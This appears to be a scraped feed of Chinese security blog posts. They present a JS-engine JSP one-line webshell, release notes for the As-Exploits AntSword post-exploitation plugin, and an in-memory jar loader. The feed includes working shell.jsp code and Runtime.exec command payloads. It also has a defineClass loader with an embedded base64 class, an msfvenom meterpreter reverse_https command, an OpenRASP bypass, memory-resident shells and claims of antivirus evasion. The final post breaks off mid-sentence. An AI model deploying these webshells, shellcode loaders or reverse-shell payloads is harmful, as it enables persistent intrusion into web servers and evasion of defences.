    <url>%2Fposts%2F%E4%B8%80%E7%A7%8D%E6%96%B0%E5%9E%8BJava%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[本文首发于先知社区前言一直以来，Java一句话木马都是采用打入字节码defineClass实现的。这种方法的优势是可以完整的打进去一个类，可以几乎实现Java上的所有功能。不足之处就是Payload过于巨大，并且不像脚本语言一样方便修改。并且还存在很多特征，例如继承ClassLoader，反射调用defineClass等。本人在这里提出一种新型Java一句话木马：利用Java中JS引擎实现的一句话木马。基本原理Java没有eval函数，Js有eval函数，可以把字符串当代码解析。Java从1.6开始自带ScriptEngineManager这个类，原生支持调用js，无需安装第三方库。ScriptEngine支持在Js中调用Java的对象。综上所述，我们可以利用Java调用JS引擎的eval，然后在Payload中反过来调用Java对象，这就是本文提出的新型Java一句话的核心原理。ScriptEngineManager全名javax.script.ScriptEngineManager，从Java 6开始自带。其中Java 6/7采用的js解析引擎是Rhino，而从java8开始换成了Nashorn。不同解析引擎对同样的代码有一些差别，这点后面有所体现。如果说原理其实一两句话就可以说清楚，但是难点在于Payload的编写。跨语言调用最大的一个难点就是数据类型以及方法的转换。例如Java中有byte数组，Js中没有怎么办？C++里有指针但是Java里没有这个玩意怎么办？在实现期间踩了很多的坑，这篇文章跟大家一起掰扯掰扯，希望能给大家提供点帮助。获取脚本引擎123456//通过脚本名称获取：ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;JavaScript&quot;); //简写为js也可以//通过文件扩展名获取： ScriptEngine engine = new ScriptEngineManager().getEngineByExtension(&quot;js&quot;); //通过MIME类型来获取： ScriptEngine engine = new ScriptEngineManager().getEngineByMimeType(&quot;text/javascript&quot;);绑定对象1234ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;js&quot;);engine.put(&quot;request&quot;, request);engine.put(&quot;response&quot;, response);engine.eval(request.getParameter(&quot;mr6&quot;));或者通过eval的重载函数，直接把对象通过一个HashMap放进去1234new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;).eval(request.getParameter(&quot;ant&quot;), new javax.script.SimpleBindings(new java.util.HashMap() &#123;&#123;put(&quot;response&quot;, response);put(&quot;request&quot;, request);&#125;&#125;))eval综合上面两步，有很多种写法，例如：shell.jsp12345678&lt;% javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;); engine.put(&quot;request&quot;, request); engine.put(&quot;response&quot;, response); engine.eval(request.getParameter(&quot;mr6&quot;));%&gt;或者直接缩写成一句：123456&lt;% new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;).eval(request.getParameter(&quot;mr6&quot;), new javax.script.SimpleBindings(new java.util.HashMap() &#123;&#123; put(&quot;response&quot;, response); put(&quot;request&quot;, request); &#125;&#125;));%&gt;以执行命令为例：POST：mr6=java.lang.Runtime.getRuntime().exec(“calc”);即可达到命令执行的效果。基本语法翻阅文档比较枯燥，这里挑一些用到的说一说。感兴趣的同学也可以看一下原文档：https://docs.oracle.com/en/java/javase/12/scripting/java-scripting-programmers-guide.pdf调用Java方法前面加上全限定类名即可12345678var s = [3];s[0] = &quot;cmd&quot;;s[1] = &quot;/c&quot;;s[2] = &quot;whoami&quot;;//yzddmr6var p = java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),&quot;GBK&quot;).useDelimiter(&quot;\\A&quot;);var result = sc.hasNext() ? sc.next() : &quot;&quot;;sc.close();导入Java类型123456var Vector = java.util.Vector;var JFrame = Packages.javax.swing.JFrame; //这种写法仅仅支持Nashorn，Rhino并不支持var Vector = Java.type(&quot;java.util.Vector&quot;)var JFrame = Java.type(&quot;javax.swing.JFrame&quot;)创建Java类型的数组12345678// Rhinovar Array = java.lang.reflect.Arrayvar intClass = java.lang.Integer.TYPEvar array = Array.newInstance(intClass, 8)// Nashornvar IntArray = Java.type(&quot;int[]&quot;)var array = new IntArray(8)导入Java类默认情况下，Nashorn 不会导入Java的包。这样主要为了避免类型冲突，比如你写了一个new String，引擎怎么知道你new的是Java的String还是js的String？所以所有的Java的调用都需要加上全限定类名。但是这样写起来很不方便。这个时候大聪明Mozilla Rhino 就想了一个办法，整了个扩展文件，里面提供了importClass 跟importPackage 方法，可以导入指定的Java包。importClass 导入指定Java的类，现在推荐用Java.typeimportPackage 导入一个Java包，类似import com.yzddmr6.*，现在推荐用JavaImporter这里需要注意的是，Rhino对该语法的错误处理机制，当被访问的类存在时，Rhino加载该class，而当其不存在时，则把它当成package名称，而并不会报错。1234567load(&quot;nashorn:mozilla_compat.js&quot;);importClass(java.util.HashSet);var set = new HashSet();importPackage(java.util);var list = new ArrayList();在一些特殊情况下，导入的全局包会影响js中的函数，例如类名冲突。这个时候可以用JavaImporter，并配合with语句，对导入的Java包设定一个使用范围。1234567891011// create JavaImporter with specific packages and classes to importvar SwingGui = new JavaImporter(javax.swing, javax.swing.event, javax.swing.border, java.awt.event);with (SwingGui) &#123; // 在with里面才可以调用swing里面的类，防止污染 var mybutton = new JButton(&quot;test&quot;); var myframe = new JFrame(&quot;test&quot;);&#125;方法调用与重载方法在JavaScript中实际上是对象的一个属性，所以除了使用 . 来调用方法之外，也可以使用[]来调用方法：123var System = Java.type(&apos;java.lang.System&apos;);System.out.println(&apos;Hello, World&apos;); // Hello, WorldSystem.out[&apos;println&apos;](&apos;Hello, World&apos;); // Hello, WorldJava支持重载（Overload）方法，例如，System.out 的 println 有多个重载版本，如果你想指定特定的重载版本，可以使用[]指定参数类型。例如：1234var System = Java.type(&apos;java.lang.System&apos;);System.out[&apos;println&apos;](3.14); // 3.14System.out[&apos;println(double)&apos;](3.14); // 3.14System.out[&apos;println(int)&apos;](3.14); // 3Payload结构设计详情写在注释里了1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950//导入基础拓展try &#123; load(&quot;nashorn:mozilla_compat.js&quot;);&#125; catch (e) &#123;&#125;//导入常见包importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);var output = new StringBuffer(&quot;&quot;); //输出var cs = &quot;$&#123;jspencode&#125;&quot;; //设置字符集编码var tag_s = &quot;$&#123;tag_s&#125;&quot;; //开始符号var tag_e = &quot;$&#123;tag_e&#125;&quot;; //结束符号try &#123; response.setContentType(&quot;text/html&quot;); request.setCharacterEncoding(cs); response.setCharacterEncoding(cs); function decode(str) &#123; //参数解码 str = str.substr(2); var bt = Base64DecodeToByte(str); return new java.lang.String(bt, cs); &#125; function Base64DecodeToByte(str) &#123; importPackage(Packages.sun.misc); importPackage(Packages.java.util); var bt; try &#123; bt = new BASE64Decoder().decodeBuffer(str); &#125; catch (e) &#123; bt = Base64.getDecoder().decode(str); &#125; return bt; &#125; function asoutput(str) &#123; //回显加密 return str; &#125; function func(z1) &#123; //eval function return z1; &#125; output.append(func(z1)); //添加功能函数回显&#125; catch (e) &#123; output.append(&quot;ERROR:// &quot; + e.toString()); //输出错误&#125;try &#123; response.getWriter().print(tag_s + asoutput(output.toString()) + tag_e); //回显&#125; catch (e) &#123;&#125;语法问题的坑两种语言对象间的相互转换要注意的是，在遇到Java跟JS可能存在类型冲突的地方，即使导入了包也要加上全限定类名。在编写payload的时候被坑了很久的一个问题就是，在导入java.lang以后写new String(bt,cs)没有加全限定类名，导致打印出来的一直是一个字符串地址。正确的操作是new java.lang.String(bt,cs)。因为在Java和Js中均存在String类，按照优先级，直接new出来的会是Js的对象。下面附上类型对比表：JavaScript ValueJavaScript TypeJava TypeIs ScriptableIs Function{a:1, b:[‘x’,‘y’]}objectorg.mozilla.javascript.NativeObject+-[1,2,3]objectorg.mozilla.javascript.NativeArray+-1numberjava.lang.Double--1.2345numberjava.lang.Double--NaNnumberjava.lang.Double--Infinitynumberjava.lang.Double---Infinitynumberjava.lang.Double--truebooleanjava.lang.Boolean--“test”stringjava.lang.String--nullobjectnull--undefinedundefinedorg.mozilla.javascript.Undefined--function () { }functionorg.mozilla.javascript.gen.c1++/.*/objectorg.mozilla.javascript.regexp.NativeRegExp++Rhino/Nashorn解析的差异这也是当时一个坑点，看下面一段代码1234567891011121314151617var readonlyenv = System.getenv();var cmdenv = new java.util.HashMap(readonlyenv);var envs = envstr.split(&quot;\\|\\|\\|asline\\|\\|\\|&quot;);for (var i = 0; i &lt; envs.length; i++) &#123; var es = envs[i].split(&quot;\\|\\|\\|askey\\|\\|\\|&quot;); if (es.length == 2) &#123; cmdenv.put(es[0], es[1]); &#125;&#125;var e = [];var i = 0;print(cmdenv+&apos;\n&apos;);for (var key in cmdenv) &#123;//关键 print(&quot;key: &quot;+key+&quot;\n&quot;); e[i] = key + &quot;=&quot; + cmdenv[key]; i++;&#125;其中cmdenv是个HashMap，这段代码在Java 8中Nashorn引擎可以正常解析，var key in cmdenv的时候把cmdenv的键给输出了但是在Java 6下运行时，Rhino把他当成了一个js对象，把其属性输出了所以涉及到这种混合写法就会有异议，不同的引擎有不同的解释。解决办法使用Java迭代器即可，不掺杂js的写法。12345678910var i = 0;var iter = cmdenv.keySet().iterator();while (iter.hasNext()) &#123; var key = iter.next(); var val = cmdenv.get(key); //print(&quot;\nkey:&quot; + key); //print(&quot;\nval:&quot; + val); e[i] = key + &quot;=&quot; + val; i++;&#125;反射的坑在Java中，如果涉及到不同版本之间类的包名不一样，我们通常不能直接导入，而要使用反射的写法。例如base64解码的时候，Java的写法如下1234567891011121314151617public byte[] Base64DecodeToByte(String str) &#123; byte[] bt = null; String version = System.getProperty(&quot;java.version&quot;); try &#123; if (version.compareTo(&quot;1.9&quot;) &gt;= 0) &#123; Class clazz = Class.forName(&quot;java.util.Base64&quot;); Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null); bt = (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str); &#125; else &#123; Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;); bt = (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str); &#125; return bt; &#125; catch (Exception e) &#123; return new byte[]&#123;&#125;; &#125;&#125;改写成js风格后，发现会有一些奇奇怪怪的BUG。（后来发现反射其实也可以实现，导入Java类型然后再传入反射参数即可，就是比较麻烦）12345678910111213141516171819function test(str) &#123; var bt = null; var version = System.getProperty(&quot;java.version&quot;); if (version.compareTo(&quot;1.9&quot;) &gt;= 0) &#123; var clazz = java.lang.Class.forName(&quot;java.util.Base64&quot;); var decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null); bt = decoder .getClass() .getMethod(&quot;decode&quot;, java.lang.String.class) .invoke(decoder, str); &#125; else &#123; var clazz = java.lang.Class.forName(&quot;sun.misc.BASE64Decoder&quot;); bt = clazz .getMethod(&quot;decodeBuffer&quot;, java.lang.String.class) .invoke(clazz.newInstance(), str); &#125; return bt;&#125;但是在Js中，我们并不需要这么麻烦。上面提到过如果importPackage了一个不存在的包名，Js引擎会将这个错误给忽略，并且由于Js松散的语言特性，我们仅仅需要正射+异常捕获就可以完成目的。大大减小了payload编写的复杂度。1234567891011function Base64DecodeToByte(str) &#123; importPackage(Packages.sun.misc); importPackage(Packages.java.util); var bt; try &#123; bt = new BASE64Decoder().decodeBuffer(str); &#125; catch (e) &#123; bt = Base64.getDecoder().decode(str); &#125; return bt;&#125;保底操作理论上，我们可以用js引擎的一句话实现所有字节码一句话的功能，退一万步讲，如果有些功能实在不好实现，或者说想套用现有的payload应该怎么办呢。我们可以用java调用js后，再调用defineClass来实现：编写一个命令执行的类：calc.java1234567891011import java.io.IOException;public class calc &#123; public calc(String cmd)&#123; try &#123; Runtime.getRuntime().exec(cmd); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125;编译之后base64一下12&gt; base64 -w 0 calc.classyv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIA填入下方payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748try &#123; load(&quot;nashorn:mozilla_compat.js&quot;);&#125; catch (e) &#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);var output = new StringBuffer(&quot;&quot;);var cs = &quot;UTF-8&quot;;response.setContentType(&quot;text/html&quot;);request.setCharacterEncoding(cs);response.setCharacterEncoding(cs);function Base64DecodeToByte(str) &#123; importPackage(Packages.sun.misc); importPackage(Packages.java.util); var bt; try &#123; bt = new BASE64Decoder().decodeBuffer(str); &#125; catch (e) &#123; bt = new Base64().getDecoder().decode(str); &#125; return bt;&#125;function define(Classdata, cmd) &#123; var classBytes = Base64DecodeToByte(Classdata); var byteArray = Java.type(&quot;byte[]&quot;); var int = Java.type(&quot;int&quot;); var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod( &quot;defineClass&quot;, byteArray.class, int.class, int.class ); defineClassMethod.setAccessible(true); var cc = defineClassMethod.invoke( Thread.currentThread().getContextClassLoader(), classBytes, 0, classBytes.length ); return cc.getConstructor(java.lang.String.class).newInstance(cmd);&#125;output.append( define( &quot;yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIAGA==&quot;, &quot;calc&quot; ));response.getWriter().print(output);成功弹出计算器也就是说，新型一句话在特殊情况下，还可以继续兼容原有的字节码一句话，甚至复用原有的Payload。测试测试环境：Java&gt;=6同样的列目录Payload，原有的字节码方式数据包长度为7378，而新型JSP一句话仅仅为2481，差不多为原有的三分之一。列目录中文测试虚拟终端数据库连接最后基于JS引擎的Java一句话体积更小，变化种类更多，使用起来更灵活。范围为Java 6及以上，基本可以满足需求，但是Payload写起来非常麻烦，也不好调试，算是有利有弊。提出新型一句话并不是说一定要取代原有的打入字节码的方式，只是在更复杂情况下，可以提供给渗透人员更多的选择。项目地址：https://github.com/AntSwordProject/antSword/commit/a6efa86f5959204140d73092b010fe0739208385]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[As-Exploits v1.3更新]]></title>
    <url>%2Fposts%2Fas-exploits-v13-update%2F</url>
    <content type="text"><![CDATA[更新主要内容v 1.3 (2021/5/14)equals支持数组传参方式，兼容各种容器jsp新增 ShellCode加载器模块，内置两种分别基于jna跟java agent的shellcode加载方式jsp新增 Bypass OpenRASP 模块，thx@GodzillaJarLoader模块 新增手动上传方式，解决因Tomcat最大POST长度为2m导致无法加载内存Jar的问题reGeorg内存马改为更稳定的neo-reGerog，默认密码：asexploits冰蝎内存马支持3.7，去除pageContext依赖，兼容Spring等容器各模块兼容JDK5挑几个重点的说说Shell入口参数支持数组形式Shell入口参数即下面new Object[]{request,response}的部分。123456&lt;% String cls = request.getParameter(&quot;ant&quot;); if (cls != null) &#123; new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]&#123;request,response&#125;); &#125;%&gt;至于为什么要改这个玩意要从内存马的兼容说起。除了由于写法问题而导致的各种乱七八糟的问题以外，连接内存马的一个主要问题是冰蝎在入口处采用了pageContext这个类来获取request response session对象。但是以filter型内存马为例，doFilter中三个参数分别是ServletRequest，ServletResponse，FilterChain，并不存在pageContext这个东西，并且在SpringBoot这种容器里根本没有pageContext这个类。于是就有跟多师傅提出了自己的解决办法，大体分为三种：自己声明一个pageContext类，在里面实现对应的request跟response的getter setter。冰蝎改造之不改动客户端=&gt;内存马。改写冰蝎的入口为request+response，不再采用pageContext作为入口。但是弊端就是不能再用equals了，要重新写一个方法用反射调用。冰蝎改造之适配基于tomcat Filter的无文件webshell采用蚁剑原来的Custom模式，把恶意函数直接通过字节码打进去，然后通过方法名调用。不过由于直接编译恶意函数的字节码较大会超过最大长度限制，一般要先写入目标然后配合URLClassLoader才能使用。使用WebLogic CVE-2020-2883配合Shiro rememberMe反序列化一键注入蚁剑shell以上的这些方法可以是可以，但是不够优雅。回想我们最开始的问题，为什么要用pageContext，是为了拿到当前请求的上下文，更精确一点就是输入输出：request,response。request是接收参数，response是回显，两者缺一不可。后来自己调试的时候发现在request中本身就包含了当前的response，同样response中也包含了当前的request。当时就想着我shell中传个request，然后在payload里面利用反射把requst里面的response取出来，或者response里面的request取出来不就完事了？这样确实可以，在2020年9月4日，勤劳的我一大早就起来写了一波代码，然后发了上去，commit记录可以证明我没有瞎bb。当时蚁剑算是最早兼容内存马的。因为Tomcat喜欢用门面模式，所以要反射两层，结果后来发现在WebLogic下用不了了，因为WebLogic不喜欢搞门面模式，只需要反射一层就够了。行吧，那我就再加一种情况，在JSP V1.4版本又增加了一层反射的情况。本来以为没事了，后来又发现在有shiro的情况下打一个servlet内存马进去，这时候去连接内存马需要反射三次？？WTF？？？然后意识到，这种case by case的解决方式是不行的，世界上还有那么多种Web容器中间件，不可能一个一个去调吧。所以为了彻底解决这个问题，在520师傅的建议下采用了数组的方式将两者直接传进去，把分析的逻辑放在打内存Shell的时候去做，而不在payload里面去做。现在冰蝎跟哥斯拉也都有了相应的机制，思路大体是一样的，感兴趣的小伙伴可以自己研究一下。JarLoader模块新增手动上传方式内存加载直接通过HTTP包将Jar打入目标内存，仅需选择本地需要上传的Jar文件即可，期间文件不落地。但是Tomcat默认POST最大上传大小为2M，如果超过了此大小请选择手动上传模式。手动上传先手动将Jar上传到目标服务器上，然后通过路径加载。JSP ShellCode加载器内置两种加载方式，使用之前请务必认真阅读使用说明，否则可能直接将Java进程打挂。需要注意两点：使用MSF需要加上PrependMigrate=true PrependMigrateProc=xxxx.exe参数，自动迁移到新的进程，否则会在migrate/exit的时候把Java进程给干掉，导致网站瘫痪。例如：msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.88.129 LPORT=8888 PrependMigrate=true PrependMigrateProc=svchost.exe -f hexJNA方式只需要X86类型的ShellCode即可，而Attach方式需要根据目标Java位数来选择对应的ShellCode。JNA方式利用第三方库JNA进行ShellCode的加载。适用范围：JDK&gt;=1.5正确操作首先利用Jar加载器将ShellCodeLoader.jar上传到目标服务器目录并加载。使用MSF或者CS生成x86类型的shellcode，并开启监听。在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。点击exploit，等待返回回话。JNA方式测试装了360，火绒，电脑管家上传插件ext目录下的ShellcodeLoader.jar到目标服务器，然后复制文件路径手动加载到JVM中MSF生成Shellcode选择JNA方式，exploit!直接上线，杀软没有拦截关于jna会生成一个临时文件的问题，发现确实会生成一个dll临时文件在Tomcat临时目录下但是扫了一下发现是免杀的VT检测结果0/68，也就是说落地也问题不大。不过可能这篇文章出来之后就没了Attach模拟java agent注入过程来实现Shellcode的加载。这个native方法是jdk自带的，并且经过oracle签名的，理论上免杀效果更好。适用范围：JDK&gt;=1.6正确操作基本信息，exploit，Ctrl+F 搜索 sun.arch.data.model，查看java位数根据java位数生成对应位数的shellcode，并开启监听。在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。点击exploit，等待返回回话。Attach方式测试发现是64位javaCS生成对应位数的shellcode，选择java格式导出。粘贴到插件中，在exploit的一刻会自动格式化为hex直接上线，杀软没有拦截。一键Bypass OpenRASP借鉴自哥斯拉的插件：Godzilla-BypassOpenRasp一键绕过OpenRASP目标安装有OpenRASP且开启命令执行拦截exploit!再次运行，即可执行命令其他reGeorg内存马改为更稳定的neo-reGerog，默认密码：asexploits冰蝎内存马去除pageContext依赖，兼容Spring等容器各模块兼容JDK5项目地址https://github.com/yzddmr6/As-Exploits来颗star吧~]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ClassLoader的理解]]></title>
    <url>%2Fposts%2FClassLoader%E7%9A%84%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[As-Exploits v1.2更新]]></title>
    <url>%2Fposts%2Fas-exploits-v12-update%2F</url>
    <content type="text"><![CDATA[前言As-Exploits，中国蚁剑后渗透模块。目前插件的定位是蚁剑的一个微内核拓展模块，可以迅速做到payload的工程化，不用过多时间浪费在插件的结构上。目前的As-Exlpoits各部分之间基本做到了解耦，新增一个payload只需要两步：1.填写payload，2. 画一个表单。其余发包，回显处理等事情框架会自动帮你实现。想要自定义的话只需要继承父类然后重写对应方法即可。其中Payload部分很多借鉴了冰蝎跟哥斯拉的实现，向其开发者们表示感谢！支持列表模块名称\Shell类型PHPASPXJSP基本信息√√√反弹Shell√√√内存马√内存马管理√杀软识别√√√提权辅助√√√屏幕截图√√ShellCode加载器√Jar加载器√本次更新主要内容aspx增加屏幕截图模块我打我自己当然实战中需要较高权限。因为在Jscript加载Assembly踩坑记里面解决了Jscript加载c#的问题，所以C#的payload理论上都可以加进去，更多其他的用法就看大家自己发挥了jsp增加Jar加载器模块打一个jar进去通常有两个用处：一是可以用来上传数据库驱动。二是把恶意类打入JVM中，后续只需要通过反射调用即可。哥斯拉的实现方式就是第一次就把所有的payload打入jvm中，后续通过反射调用。所以后续通信的流量包都非常的小，只需要传递参数即可。冰蝎跟哥斯拉都有类似的功能，研究了一下他们的实现。冰蝎冰蝎的加载jar功能内嵌于数据库连接部分，仅用于上传数据库驱动。首先把要打入的jdbc上传到目标的临时目录，然后再用URLClassLoader去加载，这里贴一下代码。net.rebeyond.behinder.ui.controller.DatabaseViewController#loadDriver12345678910111213141516171819202122232425262728293031323334353637383940414243444546private void loadDriver(String scriptType, String databaseType) throws Exception &#123; String driverPath = &quot;net/rebeyond/behinder/resource/driver/&quot;; Platform.runLater(() -&gt; &#123; this.statusLabel.setText(&quot;正在上传数据库驱动……&quot;); &#125;); String os = this.currentShellService.shellEntity.getString(&quot;os&quot;).toLowerCase(); //根据系统型号选择临时目录 String remoteDir = os.indexOf(&quot;windows&quot;) &gt;= 0 ? &quot;c:/windows/temp/&quot; : &quot;/tmp/&quot;; String libName = null; if (scriptType.equals(&quot;jsp&quot;)) &#123; //根据类型选择数据库jdbc if (databaseType.equals(&quot;sqlserver&quot;)) &#123; libName = &quot;sqljdbc41.jar&quot;; &#125; else if (databaseType.equals(&quot;mysql&quot;)) &#123; libName = &quot;mysql-connector-java-5.1.36.jar&quot;; &#125; else if (databaseType.equals(&quot;oracle&quot;)) &#123; libName = &quot;ojdbc5.jar&quot;; &#125; &#125; else if (scriptType.equals(&quot;aspx&quot;)) &#123; if (databaseType.equals(&quot;mysql&quot;)) &#123; libName = &quot;mysql.data.dll&quot;; &#125; else if (databaseType.equals(&quot;oracle&quot;)) &#123; libName = &quot;Oracle.ManagedDataAccess.dll&quot;; &#125; &#125; byte[] driverFileContent = Utils.getResourceData(driverPath + libName); String remotePath = remoteDir + libName; //将jar先上传到临时目录 this.currentShellService.uploadFile(remotePath, driverFileContent, true); Platform.runLater(() -&gt; &#123; this.statusLabel.setText(&quot;驱动上传成功，正在加载驱动……&quot;); &#125;); //将libPath传递给服务端加载 JSONObject loadRes = this.currentShellService.loadJar(remotePath); if (loadRes.getString(&quot;status&quot;).equals(&quot;fail&quot;)) &#123; throw new Exception(&quot;驱动加载失败:&quot; + loadRes.getString(&quot;msg&quot;)); &#125; else &#123; Platform.runLater(() -&gt; &#123; if (scriptType.equals(&quot;jsp&quot;)) &#123; this.statusLabel.setText(&quot;驱动加载成功，请再次点击“连接”。&quot;); &#125; this.statusLabel.setText(&quot;驱动加载成功。&quot;); &#125;); &#125; &#125;webshell获取到libPath然后用URLClassLoader去加载。net.rebeyond.behinder.payload.java.Loader哥斯拉哥斯拉的操作就比较秀了。因为打入一个jar不像打入一个class一样，直接有defineClass方法去接收一个字节数组。据我的研究，没有直接接收一个jar的字节数组的方法。打入jar需要使用URLClassLoader这个类，大概有两种方式，一种是利用http协议，远程获取所要加载的jar。另一种是file协议，从本地路径去读取jar。每次都额外搭一个http当然不方便，并且目标还不一定出网。但是file协议的话还需要把jar写到磁盘中，文件就会落地，增加了被发现的风险。但是我们回过头想，既然通过file协议加载jar，肯定会有一个通过路径找到文件，然后把文件读取到内存的过程，如果我们能跳过这个根据路径找文件的过程，直接把文件的内容写到字节数组里不就可以文件不落地了吗？哥斯拉就是采用的这种做法，利用两个子类分别继承了URLStreamHandler跟URLConnection，然后利用反射模拟了读取文件的过程。创建了一种新的协议jarmembuff然后把收到的jar文件的字节数组给放到变量里。这样就实现了文件不落地，将jar打入内存的目的。本人在As-Exploits里也采用了这种做法。小实验这里做一个小实验写一个弹框测试类123456789101112import java.io.IOException;public class calc &#123; public calc() &#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException var2) &#123; var2.printStackTrace(); &#125; &#125;&#125;jar -cvf打包成jar开个web项目，写一个test.jsp如下。去查找calc这个类并且实例化。如果实例化成功则会弹出我们的计算器。12345&lt;% Class.forName(&quot;calc&quot;).newInstance();%&gt;在第一次访问的时候找不到这个类肯定会报错然后打开插件，选择要打入的jar文件。这里可以点按钮选择，也可以直接在输入框输入绝对路径。exploit！再去刷新页面，弹出计算器。支持返回包加密选择reverse解码器返回包数据内存马兼容Spring其中 内存马管理 以及AntSword类型内存马支持Tomcat（5-9）、Spring首先要Spring中默认没有pageContext的依赖，所以相关的依赖部分都要去除。蚁剑的jsp很早就不依赖pageContext了，相关文章以前也写过，不知道的同学可以翻一翻我的博客：yzddmr6.tk。这里有两个细节关于反射的坑在研究过程中可以发现哥斯拉中的payload基本都是用反射实现的，这样的好处就是可以不添加任何依赖。这也是为什么哥斯拉只有8m的原因。去除掉所有的pageContext后，在Spring中获取servlet没有问题，但是卸载的时候内存马管理模块报了一个这样的错误：115e0d5bERROR:// java.lang.NoSuchMethodException: org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext.removeChild(org.apache.catalina.Container)adc1b2c定位一下问题出在这里意思就是在StandardContext中找不到removeChild这个方法。调试一下发现，Spring中获取到的StandardContext示例为其一个子类，叫做TomcatEmbeddedContext。虽然Spring中内置了Tomcat，但这个是Spring特有的。TomcatEmbeddedContext继承了StandardContext，并且没有对removeChild进行改写，如果父类有这个方法应该是可以调用的。那为什么会找不到方法呢？这里要提一下反射中getMethods 跟getDeclaredMethods 的区别：getMethods 获取所有公有方法（包括父类方法）getDeclaredMethods 获取本类中的所有方法 (只拿本类中的)哥斯拉中用的getDeclaredMethod，也就是只能获取到本类中的方法，自然反射拿不到父类的removeChild。所以解决办法要么把getDeclaredMethod换成getMethod，因为removeChild本来就是public的，要么就直接调用removeChild方法，不采用反射。在这里我采用了后者。在内存马模块同理，这里直接全部改了，不再用反射。addServletMapping的兼容性问题要注意的是，在添加servlet的过程中，会涉及到addServletMapping函数的兼容性问题，并且很多文章中并没有仔细分析具体的版本号。这里贴一下我研究的结果：tomcat7 只能addServletMappingtomcat8 addServletMapping/addServletMappingDecoded都可以tomcat9 